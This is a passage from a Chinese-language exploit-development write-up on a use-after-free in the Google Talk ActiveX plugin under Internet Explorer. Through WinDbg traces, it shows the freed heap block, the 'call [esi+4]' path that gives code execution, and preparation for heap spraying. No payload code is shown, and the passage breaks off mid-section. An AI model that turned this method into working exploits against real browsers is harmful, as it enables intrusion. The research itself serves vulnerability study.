     407a2fb0 ???????? ???????? ???????? ????????  
     407a2fc0 ???????? ???????? ???????? ????????  
     407a2fd0 ???????? ???????? ???????? ????????  
     407a2fe0 ???????? ???????? ???????? ????????  
     407a2ff0 ???????? ???????? ???????? ????????  
     407a3000 ???????? ???????? ???????? ????????  
     407a3010 ???????? ???????? ???????? ????????  
     407a3020 ???????? ???????? ???????? ????????  
进一步分析可知这是一块释放掉的内存：
     0:008> !heap -p -a edi  
       address 407a2fb0 found in  
       _DPH_HEAP_ROOT @ 161000  
       in free-ed allocation ( DPH_HEAP_BLOCK:     VirtAddr     VirtSize)  
                       40751ccc:     407a2000       2000  
       51f990b2 verifier!AVrfDebugPageHeapFree+0x000000c2  
       77691564 ntdll!RtlDebugFreeHeap+0x0000002f  
       7764ac29 ntdll!RtlpFreeHeap+0x0000005d  
       775f34a2 ntdll!RtlFreeHeap+0x00000142  
       75f514ad kernel32!HeapFree+0x00000014  
       13e88310 googletalkax!DllUnregisterServer+0x0001d9f0  
       13e6e407 googletalkax!DllUnregisterServer+0x00003ae7  
       13e6218a googletalkax+0x0000218a  
       13e6572f googletalkax+0x0000572f  
       61d0fe01 +0x0000001d  
       61d24fd6 MSHTML!CBase::PrivateRelease+0x000000bc  
       61d0d8ee MSHTML!CTxtSite::Release+0x0000001a  
       61d0d986 MSHTML!CBase::ReleaseInternalRef+0x0000001f  
       5e6586d3 jscript9!Js::CustomExternalObject::Dispose+0x00000023  
       5e65869c jscript9!SmallFinalizableHeapBlock::DisposeObjects+0x00000134  
       5e659880 jscript9!HeapInfo::DisposeObjects+0x000000b0  
       5e659750 jscript9!Recycler::DisposeObjects+0x0000004a  
       5e6596fe jscript9!Recycler::FinishDisposeObjects+0x0000001a  
       5e74f64c jscript9!Recycler::CollectOnConcurrentThread+0x00000087  
       5e655f36 jscript9!DefaultRecyclerCollectionWrapper::ExecuteRecyclerCollectionFunction+0x00000026  
       5e655eeb jscript9!ThreadContext::ExecuteRecyclerCollectionFunctionCommon+0x0000003b  
       5e655e6d jscript9!ThreadContext::ExecuteRecyclerCollectionFunction+0x000000ad  
       5e656a46 jscript9!Recycler::DoCollectWrapped+0x00000079  
       5e7fc8dc jscript9!Recycler::Collect+0x0000004b  
       5e64c06d jscript9!Js::InterpreterStackFrame::Process+0x00001940  
       5e64c7ab jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x000001ce  
### 0x03 测试漏洞的可利用性
接着我们来测试此漏洞的可利用性，这里需要把上述释放掉的内存块替换成新分配的内存空间，然后查看程序的运行过程中能否导致可控的代码执行，主要借助的是[.dvalloc](https://msdn.microsoft.com/en-us/library/windows/hardware/ff562434%28v=vs.85%29.aspx)命令。
通过查看下述代码，我们发现其中存在一条能导致代码执行的路径。首先，EDI+1Ch指向的内存值被存入到EAX寄存器，而后EAX指向的内存值又被赋值给了ESI寄存器，再往下程序会执行一些其它操作和函数调用并最终来到ESI+4指向的地址。
     13e70ca5 8b471c        mov   eax,dword ptr [edi+1Ch]  
     13e70ca8 8b30          mov   esi,dword ptr [eax] ds:002b:00000000=????????  
     13e70caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     13e70cb0 50            push  eax  
     13e70cb1 8d45e4        lea   eax,[ebp-1Ch]  
     13e70cb4 50            push  eax  
     13e70cb5 e8768e0000    call  googletalkax!DllUnregisterServer+0xf210 (13e79b30)  
     13e70cba 8b4f1c        mov   ecx,dword ptr [edi+1Ch]  
     13e70cbd 83c408        add   esp,8  
     13e70cc0 50            push  eax  
     13e70cc1 ff5604        call  dword ptr [esi+4]  
我们需要确保13e70cb5处的函数调用不会改变ESI寄存器的值，这样上面找到的执行路径才是可控的。下述的WinDbg调试过程给出了如何分配新的内存空间来替换释放掉的内存块，并通过单步跟踪来确认此路径能导致代码的执行。
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\Sean\AppData\Local\Google\Google Talk Plugin\googletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=111e2fb0  
     eip=59d80ca5 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00010246  
     googletalkax!DllUnregisterServer+0x6385:  
     59d80ca5 8b471c     mov   eax,dword ptr [edi+1Ch] ds:002b:111e2fcc=????????  
     0:008> .dvalloc 2000h  
     Allocated 2000 bytes starting at 0c690000  
     0:008> r @edi = 0c690000  
     0:008> dd edi+1c  
     0c69001c 00000000 00000000 00000000 00000000  
     0c69002c 00000000 00000000 00000000 00000000  
     0c69003c 00000000 00000000 00000000 00000000  
     0c69004c 00000000 00000000 00000000 00000000  
     0c69005c 00000000 00000000 00000000 00000000  
     0c69006c 00000000 00000000 00000000 00000000  
     0c69007c 00000000 00000000 00000000 00000000  
     0c69008c 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=00000000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80ca8 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6388:  
     59d80ca8 8b30      mov   esi,dword ptr [eax] ds:002b:00000000=????????  
     0:008> .dvalloc 200  
     Allocated 1000 bytes starting at 0cbd0000  
     0:008> r @eax = 0cbd0000  
     0:008> dd eax  
     0cbd0000 00000000 00000000 00000000 00000000  
     0cbd0010 00000000 00000000 00000000 00000000  
     0cbd0020 00000000 00000000 00000000 00000000  
     0cbd0030 00000000 00000000 00000000 00000000  
     0cbd0040 00000000 00000000 00000000 00000000  
     0cbd0050 00000000 00000000 00000000 00000000  
     0cbd0060 00000000 00000000 00000000 00000000  
     0cbd0070 00000000 00000000 00000000 00000000  
     0:008> p  
     eax=0cbd0000 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80caa esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x638a:  
     59d80caa 8d850cffffff  lea   eax,[ebp-0F4h]  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6390:  
     59d80cb0 50       push  eax  
     0:008> p  
     eax=09d7c510 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6391:  
     59d80cb1 8d45e4     lea   eax,[ebp-1Ch]  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb4 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6394:  
     59d80cb4 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cb5 esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x6395:  
     59d80cb5 e8768e0000   call  googletalkax!DllUnregisterServer+0xf210 (59d89b30)  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=ef97dd9c edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cba esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639a:  
     59d80cba 8b4f1c     mov   ecx,dword ptr [edi+1Ch] ds:002b:0c69001c=00000000  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cbd esp=09d7c4e8 ebp=09d7c604 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000246  
     googletalkax!DllUnregisterServer+0x639d:  
     59d80cbd 83c408     add   esp,8  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc0 esp=09d7c4f0 ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a0:  
     59d80cc0 50       push  eax  
     0:008> p  
     eax=09d7c5e8 ebx=00000001 ecx=00000000 edx=02c51078 esi=00000000 edi=0c690000  
     eip=59d80cc1 esp=09d7c4ec ebp=09d7c604 iopl=0     nv up ei pl nz ac pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00000216  
     googletalkax!DllUnregisterServer+0x63a1:  
     59d80cc1 ff5604     call  dword ptr [esi+4]  ds:002b:00000004=????????  
     0:008> p  
     (11cc.2728): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
这表明如果能在释放掉的内存块中写入我们精心构造的数据，那么就能将此漏洞转换成可利用的代码执行。
### 0x04 堆分配
我们知道该释放掉的内存块是位于堆空间上的，接下去就来看下它的分配。先在Gflags的设置中勾选“Create User Mode Stack Trace
Database”这一项，我们要能够在同一堆区上分配相同大小的内存空间，这样才能满足堆喷的利用条件，因此需要确定释放的内存是分配在哪块堆上的。
通过下述HTML代码我们可以将特定的数据分配到IE的默认堆上：
然后借助WinDbg来看下堆分配的情况：
     (1348.18dc): Access violation - code c0000005 (first chance)  
     First chance exceptions are reported before any exception handling.  
     This exception may be expected and handled.  
     *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\Sean\AppData\Local\Google\Google Talk Plugin\googletalkax.dll -   
     eax=00000001 ebx=00000001 ecx=d215f8bc edx=00461078 esi=00000000 edi=3dc19fb0  
     eip=14d10ca5 esp=09b3bf10 ebp=09b3c024 iopl=0     nv up ei pl zr na pe nc  
     cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b       efl=00210246  
     googletalkax!DllUnregisterServer+0x6385:  